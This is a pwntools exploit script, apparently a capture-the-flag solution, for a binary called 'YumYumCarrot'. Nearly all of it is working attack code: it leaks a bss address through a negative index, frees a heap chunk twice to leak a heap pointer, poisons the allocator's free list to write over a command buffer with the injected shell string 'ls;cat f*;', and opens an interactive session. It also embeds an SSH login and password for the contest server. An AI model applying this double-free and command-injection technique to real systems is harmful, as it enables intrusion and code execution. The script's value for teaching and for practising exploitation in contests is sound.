from pwn import *
context.log_level = 'debug'

TARGET = './YumYumCarrot'
HOST = ''
PORT = 0 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)

    else:
        print "remote" 
        # return remote(HOST, PORT)
        return process('sh', stdout=process.PTY, stdin=process.PTY)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set follow-fork-mode parent\n"
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, []) 

if args.R:
    r.sendline('ssh yeet@ctf.kaf.sh -p 7040')
    r.sendlineafter('password:', '12345678')

r.sendlineafter('Choice: ', '5')
r.sendlineafter(': ', '-1')
r.recvuntil('Carrots are at ')
bss_leak = int(r.recvuntil('!')[:-1], 16)
dbg("bss_leak")
target = bss_leak + 0x40 + 0x20 - 0xb0
command = target - 0xb0

r.sendlineafter('Choice: ', '1')
r.sendlineafter(': ', '1')
r.sendlineafter(': ', '40')

r.sendlineafter('Choice: ', '2')
r.sendlineafter(': ', '1')

r.sendlineafter('Choice: ', '2')
r.sendlineafter(': ', '1')

r.sendlineafter('Choice: ', '1')
r.sendlineafter(': ', '4')
r.sendlineafter(': ', '40')
r.recvuntil('\n')
heap_leak = int(r.recvuntil('\n')[:-1], 16)
dbg("heap_leak")

r.sendlineafter(': ', p64(target))

r.sendlineafter('Choice: ', '1')
r.sendlineafter(': ', '1')
r.sendlineafter(': ', '40')

r.sendlineafter('Choice: ', '1')
r.sendlineafter(': ', '4')
r.sendlineafter(': ', '40')
r.sendlineafter(': ', "ls;cat f*;")

# r.sendlineafter('Choice: ', '3')
# r.sendlineafter(': ', '2')
# r.sendlineafter(': ', '0x6465')
r.sendlineafter('Choice: ', '4')
# sleep(0.1)
# r.sendline('!sh')

r.interactive()

